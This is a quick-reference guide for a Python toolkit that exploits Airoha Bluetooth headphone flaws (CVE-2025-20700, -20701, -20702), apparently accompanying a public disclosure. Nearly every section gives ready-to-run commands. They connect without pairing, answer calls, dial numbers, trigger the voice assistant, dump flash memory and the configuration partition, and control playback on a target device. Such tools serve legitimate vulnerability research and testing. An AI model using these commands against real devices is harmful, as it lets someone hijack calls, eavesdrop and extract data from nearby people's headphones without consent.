# RACE Toolkit - Quick Reference

## Quick Start

### 1. Test Device for All Vulnerabilities
```bash
python race_toolkit.py -c usb:0 check
```
**→** Follow interactive prompts to test CVE-2025-20700, CVE-2025-20701, and CVE-2025-20702

---

## CVE-Specific Tests

### CVE-2025-20700: Missing BLE GATT Authentication

**Discover BLE Devices**
```bash
python race_toolkit.py -c usb:0 scan --mode ble --timeout 10
```

**Enumerate GATT Services (No Auth)**
```bash
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-info
```
**→** Should see all GATT services without pairing prompt

---

### CVE-2025-20701: Missing Classic Bluetooth Authentication

**Discover Classic Devices**
```bash
python race_toolkit.py -c usb:0 scan --mode classic
```

**Enumerate Classic Services (No Pairing)**
```bash
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF enumerate-classic
```

**Exploit Hands-Free Profile**
```bash
# Get device info
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action info

# Answer call
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action answer

# Dial number
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action dial --number 5551234

# Trigger voice assistant
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action voice
```

---

### CVE-2025-20702: RACE Protocol Exposure

**Test RACE Over RFCOMM (No Auth)**
```bash
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF enumerate-race
```

---

## RACE Protocol Commands

### Get Bluetooth Classic Address
```bash
python race_toolkit.py --target-address AA:BB:CC:DD:EE:FF bdaddr
```

### Dump Flash Memory
```bash
python race_toolkit.py --target-address AA:BB:CC:DD:EE:FF flash --address 0x0 --size 0x1000
```

### Dump Configuration Partition
```bash
python race_toolkit.py --target-address AA:BB:CC:DD:EE:FF --outfile nvdm.bin dump-partition
```
**→** Select partition 6 (NVDM) when prompted

### Get SDK Info
```bash
python race_toolkit.py --target-address AA:BB:CC:DD:EE:FF sdkinfo
```

### Get Build Version
```bash
python race_toolkit.py --target-address AA:BB:CC:DD:EE:FF buildversion
```

---

## Utility Commands

### Passive BLE Monitoring
```bash
# Continuous monitoring (Ctrl+C to stop)
python race_toolkit.py -c usb:0 sniff

# Filter by name
python race_toolkit.py -c usb:0 sniff --filter "Sony"

# Show all details
python race_toolkit.py -c usb:0 sniff --show-raw --show-uuids --active
```

### Scan Both Classic and BLE
```bash
python race_toolkit.py -c usb:0 scan --mode both --timeout 15
```

---

## Experimental Commands

### BLE Speaker Control [EXPERIMENTAL]
```bash
# Discover characteristics
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-speaker --action probe

# Test writable characteristics
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-speaker --action write-test
```
**⚠️ Limited success - vendor-specific**

### AVRCP Media Control [EXPERIMENTAL]
```bash
# Test connection
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF avrcp --action info

# Media controls
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF avrcp --action play
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF avrcp --action vol-up --repeat 5
```
**⚠️ May fail if device is connected elsewhere**

---

## Common Issues

### BLE Connection Fails
Try adding `/P` (public) or `/R` (random) address type:
```bash
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF/P ble-info
```
Auto-detection tries public first, then random.

### Classic Connection Timeout
1. Ensure device is not connected to phone/computer
2. Some devices need pairing mode enabled
3. Try `--authenticate` flag if needed

### AVRCP Connection Cancelled
Device is likely connected to another source. Disconnect other devices first.

---

## Environment Setup

### Using uv (Recommended)
```bash
uv run python race_toolkit.py -c usb:0 check
```

### Using venv
```bash
source .venv/bin/activate
python race_toolkit.py -c usb:0 check
```

### With RTL8761 Firmware
```bash
env -i HOME="$HOME" PATH="$PATH" BUMBLE_RTK_FIRMWARE_DIR="$HOME/rtk_fw" \
  uv run python race_toolkit.py -c usb:0 check
```

---

## Get Help

```bash
# Main help
python race_toolkit.py --help

# Command-specific help
python race_toolkit.py check --help
python race_toolkit.py hfp-demo --help
python race_toolkit.py ble-info --help
```

---

## Resources

- **Full Documentation**: See README.md
- **Code Review**: See ANALYSIS.md
- **Change Log**: See CHANGES.md
- **Original Research**: https://insinuator.net/2025/12/bluetooth-headphone-jacking-full-disclosure-of-airoha-race-vulnerabilities
